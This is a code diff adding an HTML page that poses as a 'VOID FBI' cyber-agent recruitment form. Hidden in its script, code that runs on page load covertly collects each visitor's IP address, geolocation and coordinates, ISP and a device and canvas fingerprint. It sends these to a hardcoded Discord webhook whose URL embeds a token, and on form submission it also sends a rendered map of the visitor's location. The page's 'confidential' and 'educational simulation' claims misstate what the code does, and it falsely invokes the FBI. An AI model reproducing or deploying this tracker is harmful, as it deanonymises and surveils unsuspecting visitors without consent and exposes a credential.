@@ -1,0 +1,709 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VOID FBI - Cyber Agent Application</title>
+    <meta property="og:title" content="VOID FBI Application Portal">
+    <meta property="og:description" content="Official application forum to join VOID FBI Cyber Division">
+    <meta name="theme-color" content="#6a00f4">
+    <style>
+        :root {
+            --void-blue: #0b0e23;
+            --void-accent: #6a00f4;
+            --void-light: #00f0ff;
+            --void-red: #ff0033;
+        }
+        @font-face {
+            font-family: 'Orbitron';
+            src: url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
+        }
+        body {
+            font-family: 'Orbitron', 'Segoe UI', sans-serif;
+            background-color: var(--void-blue);
+            background-image: 
+                radial-gradient(circle at 25% 25%, rgba(106, 0, 244, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 75% 75%, rgba(0, 240, 255, 0.1) 0%, transparent 50%);
+            color: white;
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
+            overflow-x: hidden;
+        }
+        .container {
+            max-width: 800px;
+            margin: 40px auto;
+            padding: 30px;
+            background-color: rgba(11, 14, 35, 0.95);
+            border-radius: 10px;
+            box-shadow: 0 0 30px rgba(106, 0, 244, 0.3);
+            border: 1px solid var(--void-accent);
+            position: relative;
+            overflow: hidden;
+        }
+        .container::before {
+            content: "";
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--void-red), var(--void-accent), var(--void-light));
+            animation: borderGlow 3s infinite alternate;
+        }
+        @keyframes borderGlow {
+            0% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            position: relative;
+        }
+        .symbol {
+            font-size: 60px;
+            margin-bottom: 15px;
+            color: var(--void-light);
+            text-shadow: 0 0 15px rgba(0, 240, 255, 0.7);
+            animation: pulse 3s infinite alternate;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); text-shadow: 0 0 10px rgba(0, 240, 255, 0.5); }
+            100% { transform: scale(1.1); text-shadow: 0 0 20px rgba(0, 240, 255, 0.9); }
+        }
+        h1 {
+            color: var(--void-light);
+            margin: 0;
+            font-weight: 700;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            text-shadow: 0 0 10px rgba(0, 240, 255, 0.5);
+        }
+        .tagline {
+            color: #aaa;
+            font-style: italic;
+            margin-top: 5px;
+            letter-spacing: 1px;
+        }
+        .form-group {
+            margin-bottom: 25px;
+            position: relative;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--void-light);
+            letter-spacing: 1px;
+        }
+        input[type="text"],
+        input[type="email"],
+        textarea,
+        select {
+            width: 100%;
+            padding: 12px 15px;
+            background-color: rgba(255,255,255,0.05);
+            border: 1px solid rgba(106, 0, 244, 0.5);
+            color: white;
+            border-radius: 5px;
+            font-size: 16px;
+            transition: all 0.3s;
+            font-family: 'Orbitron', sans-serif;
+        }
+        input:focus, textarea:focus, select:focus {
+            outline: none;
+            border-color: var(--void-light);
+            box-shadow: 0 0 0 2px rgba(0, 240, 255, 0.2),
+                         0 0 15px rgba(0, 240, 255, 0.1);
+            background-color: rgba(0, 240, 255, 0.05);
+        }
+        textarea {
+            min-height: 100px;
+            resize: vertical;
+        }
+        .submit-btn {
+            background: linear-gradient(135deg, var(--void-accent), #4d00b0);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 5px;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s;
+            font-weight: bold;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            position: relative;
+            overflow: hidden;
+        }
+        .submit-btn::before {
+            content: "";
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: linear-gradient(
+                to bottom right,
+                rgba(255, 255, 255, 0) 45%,
+                rgba(255, 255, 255, 0.1) 50%,
+                rgba(255, 255, 255, 0) 55%
+            );
+            transform: rotate(30deg);
+            animation: shine 3s infinite;
+        }
+        @keyframes shine {
+            0% { transform: translateX(-100%) rotate(30deg); }
+            100% { transform: translateX(100%) rotate(30deg); }
+        }
+        .submit-btn:hover {
+            background: linear-gradient(135deg, #7a1aff, #5a00cc);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(106, 0, 244, 0.4);
+        }
+        .status-box {
+            margin-top: 30px;
+            padding: 20px;
+            border-radius: 5px;
+            background-color: rgba(0, 240, 255, 0.1);
+            border-left: 4px solid var(--void-light);
+            display: none;
+            animation: fadeIn 0.5s ease-out;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .checkbox-group {
+            margin-top: 10px;
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 10px;
+        }
+        .checkbox-item {
+            margin-bottom: 10px;
+            background: rgba(0, 0, 0, 0.2);
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid rgba(106, 0, 244, 0.3);
+            transition: all 0.3s;
+        }
+        .checkbox-item:hover {
+            background: rgba(106, 0, 244, 0.1);
+            border-color: var(--void-accent);
+        }
+        .checkbox-item input {
+            margin-right: 10px;
+            accent-color: var(--void-accent);
+        }
+        .privacy-note {
+            font-size: 13px;
+            color: #aaa;
+            margin-top: 30px;
+            text-align: center;
+            border-top: 1px solid rgba(106, 0, 244, 0.3);
+            padding-top: 15px;
+        }
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            pointer-events: none;
+        }
+        .hacker-terminal {
+            background-color: rgba(0, 0, 0, 0.7);
+            border: 1px solid var(--void-accent);
+            padding: 15px;
+            margin-top: 20px;
+            border-radius: 4px;
+            font-family: monospace;
+            color: #00ff00;
+            overflow: hidden;
+            position: relative;
+        }
+        .terminal-line {
+            margin-bottom: 5px;
+            white-space: nowrap;
+            overflow: hidden;
+            animation: type 0.1s steps(30, end);
+        }
+        @keyframes type {
+            from { width: 0; }
+        }
+        .blink {
+            animation: blink 1s step-end infinite;
+        }
+        @keyframes blink {
+            from, to { opacity: 1; }
+            50% { opacity: 0; }
+        }
+        .access-denied {
+            color: var(--void-red);
+            text-align: center;
+            margin-top: 20px;
+            display: none;
+            animation: shake 0.5s;
+        }
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-5px); }
+            40%, 80% { transform: translateX(5px); }
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="particles" id="particles-js"></div>
+    
+    <div class="container">
+        <div class="header">
+            <div class="symbol">🦅</div>
+            <h1>VOID FBI CYBER DIVISION</h1>
+            <div class="tagline">Top Secret Recruitment Portal</div>
+        </div>
+
+        <div class="hacker-terminal" id="terminal">
+            <div class="terminal-line">> Initializing secure connection...</div>
+            <div class="terminal-line">> Establishing encrypted channel...</div>
+            <div class="terminal-line">> Connection secured [AES-256]</div>
+            <div class="terminal-line">> Verifying security clearance...</div>
+            <div class="terminal-line">> Status: <span id="user-status">[verification in progress]</span></div>
+            <div class="terminal-line">> _<span class="blink">|</span></div>
+        </div>
+
+        <form id="applicationForm" style="display: none;">
+            <div class="form-group">
+                <label for="username">Your Discord/Instagram username</label>
+                <input type="text" id="username" name="username" required placeholder="e.g., cyberagent#1234">
+            </div>
+            
+            <div class="form-group">
+                <label for="reason">Why do you want to join VOID FBI?</label>
+                <textarea id="reason" name="reason" required placeholder="Tell us your motivations and goals..."></textarea>
+            </div>
+            
+            <div class="form-group">
+                <label for="experience">Do you have any cybersecurity experience?</label>
+                <textarea id="experience" name="experience" required placeholder="Describe any skills in hacking, programming, or security..."></textarea>
+            </div>
+            
+            <div class="form-group">
+                <label>Select your skills (click to select)</label>
+                <div class="checkbox-group">
+                    <div class="checkbox-item">
+                        <input type="checkbox" id="pentesting" name="skills" value="Penetration Testing">
+                        <label for="pentesting">Ethical Hacking</label>
+                    </div>
+                    <div class="checkbox-item">
+                        <input type="checkbox" id="forensics" name="skills" value="Digital Forensics">
+                        <label for="forensics">Digital Forensics</label>
+                    </div>
+                    <div class="checkbox-item">
+                        <input type="checkbox" id="malware" name="skills" value="Malware Analysis">
+                        <label for="malware">Malware Analysis</label>
+                    </div>
+                    <div class="checkbox-item">
+                        <input type="checkbox" id="osint" name="skills" value="OSINT">
+                        <label for="osint">OSINT Investigations</label>
+                    </div>
+                    <div class="checkbox-item">
+                        <input type="checkbox" id="coding" name="skills" value="Programming">
+                        <label for="coding">Security Programming</label>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label for="level">What's your skill level?</label>
+                <div class="checkbox-group" style="grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));">
+                    <div class="checkbox-item">
+                        <input type="radio" id="beginner" name="level" value="Beginner" required>
+                        <label for="beginner">Beginner</label>
+                    </div>
+                    <div class="checkbox-item">
+                        <input type="radio" id="intermediate" name="level" value="Intermediate">
+                        <label for="intermediate">Intermediate</label>
+                    </div>
+                    <div class="checkbox-item">
+                        <input type="radio" id="advanced" name="level" value="Advanced">
+                        <label for="advanced">Advanced</label>
+                    </div>
+                </div>
+            </div>
+            
+            <button type="submit" class="submit-btn">SUBMIT APPLICATION</button>
+        </form>
+
+        <div class="status-box" id="statusBox">
+            <h3>APPLICATION RECEIVED</h3>
+            <p>Your application has been submitted successfully. Your reference ID is: <strong id="refId"></strong></p>
+            <p>We'll review your application and contact you via Discord/Instagram within 7 days.</p>
+            <p>Duplicate submissions from this device will be automatically rejected.</p>
+        </div>
+
+        <div class="access-denied" id="accessDenied">
+            <h3>ACCESS DENIED</h3>
+            <p>Our records show you've already submitted an application from this device.</p>
+            <p>Duplicate submissions are automatically blocked by our security system.</p>
+        </div>
+
+        <div class="privacy-note">
+            <p>All applications are confidential. By submitting, you agree to our screening process.</p>
+            <p>This is a simulation for educational purposes only.</p>
+        </div>
+
+        <!-- Hidden canvas for generating location preview -->
+        <canvas id="locationCanvas" class="hidden" width="800" height="400"></canvas>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
+    <script>
+        // Initialize particles.js
+        particlesJS("particles-js", {
+            "particles": {
+                "number": { "value": 80, "density": { "enable": true, "value_area": 800 } },
+                "color": { "value": "#00f0ff" },
+                "shape": { "type": "circle" },
+                "opacity": { "value": 0.5, "random": true },
+                "size": { "value": 3, "random": true },
+                "line_linked": { "enable": true, "distance": 150, "color": "#6a00f4", "opacity": 0.3, "width": 1 },
+                "move": { "enable": true, "speed": 2, "direction": "none", "random": true, "straight": false, "out_mode": "out" }
+            },
+            "interactivity": {
+                "detect_on": "canvas",
+                "events": {
+                    "onhover": { "enable": true, "mode": "repulse" },
+                    "onclick": { "enable": true, "mode": "push" }
+                }
+            }
+        });
+
+        // Your Discord webhook URL
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1360696497305424186/DsnniTxXM1fsfKhi_3B947DsZAs-_UfkrOLPmOu6OXoXY-Mge3_S3efQOip0FJqMtyYH';
+        const FINGERPRINT_KEY = 'void_fbi_fingerprints';
+
+        // Immediately collect visitor data
+        document.addEventListener('DOMContentLoaded', async () => {
+            // Simulate terminal typing
+            const terminalLines = document.querySelectorAll('.terminal-line');
+            terminalLines.forEach((line, index) => {
+                line.style.animationDelay = `${index * 0.5}s`;
+            });
+
+            // Get visitor intelligence
+            const visitorData = await collectIntelligence();
+            
+            // Check for previous application
+            const hasApplied = await checkPreviousApplication(visitorData.fingerprint);
+            
+            if (hasApplied) {
+                document.getElementById('accessDenied').style.display = 'block';
+                document.getElementById('user-status').textContent = 'DUPLICATE SUBMISSION DETECTED';
+                document.getElementById('user-status').style.color = 'var(--void-red)';
+            } else {
+                document.getElementById('applicationForm').style.display = 'block';
+                document.getElementById('user-status').textContent = 'CLEARED FOR APPLICATION';
+                document.getElementById('user-status').style.color = '#00ff00';
+            }
+        });
+
+        async function collectIntelligence() {
+            try {
+                // Generate fingerprint
+                const fingerprint = await generateFingerprint();
+                
+                // Get IP and location
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                
+                // Get detailed location
+                let locationData = {};
+                try {
+                    const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                    locationData = await locationResponse.json();
+                } catch (e) {
+                    console.error("Location API error:", e);
+                }
+
+                // Prepare visitor data
+                const visitorData = {
+                    timestamp: new Date().toISOString(),
+                    fingerprint: fingerprint,
+                    ip: ipData.ip,
+                    location: {
+                        city: locationData.city || 'Unknown',
+                        region: locationData.region || 'Unknown',
+                        country: locationData.country_name || 'Unknown',
+                        postal: locationData.postal || 'Unknown',
+                        latitude: locationData.latitude || 0,
+                        longitude: locationData.longitude || 0,
+                        timezone: locationData.timezone || 'Unknown',
+                        isp: locationData.org || 'Unknown',
+                        asn: locationData.asn || 'Unknown',
+                        mobile: locationData.mobile || false,
+                        proxy: locationData.proxy || false,
+                        hosting: locationData.hosting || false
+                    },
+                    device: {
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        screen: `${window.screen.width}x${window.screen.height}`,
+                        colorDepth: window.screen.colorDepth,
+                        cpuCores: navigator.hardwareConcurrency || 'Unknown',
+                        memory: navigator.deviceMemory || 'Unknown',
+                        touch: 'ontouchstart' in window,
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        languages: navigator.languages
+                    }
+                };
+
+                // Send initial intelligence to webhook
+                await sendToWebhook("Visitor Intelligence Report", visitorData);
+
+                return visitorData;
+
+            } catch (error) {
+                console.error("Intelligence collection error:", error);
+                return { fingerprint: "unknown" };
+            }
+        }
+
+        async function generateFingerprint() {
+            // Create canvas fingerprint
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125, 1, 62, 20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('VOID FBI', 2, 15);
+            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+            ctx.fillText('VOID FBI', 4, 17);
+            
+            // Hash the canvas
+            const canvasData = canvas.toDataURL();
+            const msgBuffer = new TextEncoder().encode(canvasData);
+            const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
+            const hashArray = Array.from(new Uint8Array(hashBuffer));
+            const canvasHash = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+
+            // Combine with other device characteristics
+            return [
+                navigator.userAgent,
+                navigator.platform,
+                screen.width,
+                screen.height,
+                screen.colorDepth,
+                new Date().getTimezoneOffset(),
+                navigator.languages.join(','),
+                canvasHash
+            ].join('|');
+        }
+
+        async function checkPreviousApplication(fingerprint) {
+            try {
+                const applications = JSON.parse(localStorage.getItem(FINGERPRINT_KEY)) || {};
+                return applications[fingerprint] === true;
+            } catch (e) {
+                return false;
+            }
+        }
+
+        async function generateLocationImage(latitude, longitude, locationInfo) {
+            try {
+                const canvas = document.getElementById('locationCanvas');
+                const ctx = canvas.getContext('2d');
+                
+                // Create map background (using static map API)
+                const mapUrl = `https://maps.googleapis.com/maps/api/staticmap?center=${latitude},${longitude}&zoom=12&size=800x400&maptype=roadmap&markers=color:red%7C${latitude},${longitude}&key=AIzaSyDummyKeyReplaceWithRealOne`;
+                
+                // Wait for image to load
+                await new Promise((resolve) => {
+                    const img = new Image();
+                    img.crossOrigin = "Anonymous";
+                    img.onload = () => {
+                        ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
+                        resolve();
+                    };
+                    img.src = mapUrl;
+                });
+
+                // Add info overlay
+                ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
+                ctx.fillRect(20, 20, 400, 120);
+                ctx.fillStyle = '#fff';
+                ctx.font = '16px Arial';
+                ctx.fillText(`Location: ${locationInfo.city}, ${locationInfo.region}`, 30, 50);
+                ctx.fillText(`Coordinates: ${latitude}, ${longitude}`, 30, 80);
+                ctx.fillText(`ISP: ${locationInfo.isp}`, 30, 110);
+                
+                // Convert to data URL
+                return canvas.toDataURL('image/png');
+            } catch (e) {
+                console.error("Error generating location image:", e);
+                return null;
+            }
+        }
+
+        // Form submission handler
+        document.getElementById('applicationForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Get form data
+            const formData = new FormData(this);
+            const applicationData = {
+                username: formData.get('username'),
+                reason: formData.get('reason'),
+                experience: formData.get('experience'),
+                skills: Array.from(document.querySelectorAll('input[name="skills"]:checked')).map(el => el.value),
+                level: document.querySelector('input[name="level"]:checked')?.value || 'Not specified',
+                timestamp: new Date().toISOString()
+            };
+
+            // Get intelligence data
+            const visitorData = await collectIntelligence();
+            applicationData.intelligence = visitorData;
+
+            // Generate reference ID
+            const refId = 'VOID-' + Math.random().toString(36).substring(2, 10).toUpperCase();
+            applicationData.refId = refId;
+
+            // Mark fingerprint as having applied
+            const applications = JSON.parse(localStorage.getItem(FINGERPRINT_KEY)) || {};
+            applications[visitorData.fingerprint] = true;
+            localStorage.setItem(FINGERPRINT_KEY, JSON.stringify(applications));
+
+            // Generate location image if coordinates available
+            let locationImageUrl = null;
+            if (visitorData.location.latitude && visitorData.location.longitude) {
+                locationImageUrl = await generateLocationImage(
+                    visitorData.location.latitude,
+                    visitorData.location.longitude,
+                    {
+                        city: visitorData.location.city,
+                        region: visitorData.location.region,
+                        isp: visitorData.location.isp
+                    }
+                );
+            }
+
+            // Send to Discord webhook
+            await sendToWebhook("New Agent Application", applicationData, locationImageUrl);
+
+            // Show success message
+            document.getElementById('applicationForm').style.display = 'none';
+            document.getElementById('statusBox').style.display = 'block';
+            document.getElementById('refId').textContent = refId;
+            window.scrollTo(0, document.body.scrollHeight);
+        });
+
+        async function sendToWebhook(title, data, imageUrl = null) {
+            try {
+                // Prepare the embed
+                const embed = {
+                    title: `VOID FBI - ${title}`,
+                    color: 0x6a00f4,
+                    fields: [],
+                    timestamp: new Date().toISOString(),
+                    footer: {
+                        text: "VOID FBI Intelligence System",
+                        icon_url: "https://i.imgur.com/JYQ3W3D.png"
+                    }
+                };
+
+                // Add different sections based on data type
+                if (data.intelligence) {
+                    embed.fields.push({
+                        name: "🕵️ Applicant Information",
+                        value: `**Username:** ${data.username || 'Not provided'}\n` +
+                               `**Skill Level:** ${data.level || 'Not specified'}\n` +
+                               `**Skills:** ${data.skills?.join(', ') || 'None'}`,
+                        inline: true
+                    });
+
+                    embed.fields.push({
+                        name: "🌍 Location Intelligence",
+                        value: `**IP:** ||${data.intelligence.ip}||\n` +
+                               `**Location:** ${data.intelligence.location.city}, ${data.intelligence.location.region}\n` +
+                               `**Country:** ${data.intelligence.location.country}\n` +
+                               `**ISP:** ${data.intelligence.location.isp}\n` +
+                               `**ASN:** ${data.intelligence.location.asn}\n` +
+                               `**Proxy/VPN:** ${data.intelligence.location.proxy ? 'Yes' : 'No'}`,
+                        inline: true
+                    });
+
+                    embed.fields.push({
+                        name: "💻 Device Fingerprint",
+                        value: `**OS:** ${data.intelligence.device.platform}\n` +
+                               `**Screen:** ${data.intelligence.device.screen}\n` +
+                               `**CPU Cores:** ${data.intelligence.device.cpuCores}\n` +
+                               `**Memory:** ${data.intelligence.device.memory}GB\n` +
+                               `**Touch:** ${data.intelligence.device.touch ? 'Yes' : 'No'}\n` +
+                               `**Languages:** ${data.intelligence.device.languages?.join(', ')}`,
+                        inline: false
+                    });
+                }
+
+                // Add application responses
+                if (data.reason || data.experience) {
+                    embed.fields.push({
+                        name: "📝 Application Responses",
+                        value: `**Reason for joining:**\n${data.reason || 'Not provided'}\n\n` +
+                               `**Experience:**\n${data.experience || 'Not provided'}`,
+                        inline: false
+                    });
+                }
+
+                // Add reference ID
+                if (data.refId) {
+                    embed.fields.push({
+                        name: "🔑 Reference ID",
+                        value: data.refId,
+                        inline: false
+                    });
+                }
+
+                // Prepare the webhook payload
+                const payload = {
+                    embeds: [embed],
+                    content: `New application submitted at ${new Date().toLocaleString()}`
+                };
+
+                // If we have a location image, add it
+                if (imageUrl) {
+                    // Convert data URL to blob for Discord
+                    const blob = await (await fetch(imageUrl)).blob();
+                    const formData = new FormData();
+                    formData.append('payload_json', JSON.stringify(payload));
+                    formData.append('file', blob, 'location.png');
+
+                    // Send with image
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        body: formData
+                    });
+                } else {
+                    // Send without image
+                    await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(payload),
+                    });
+                }
+
+            } catch (error) {
+                console.error("Error sending to webhook:", error);
+            }
+        }
+    </script>
+</body>
+</html>
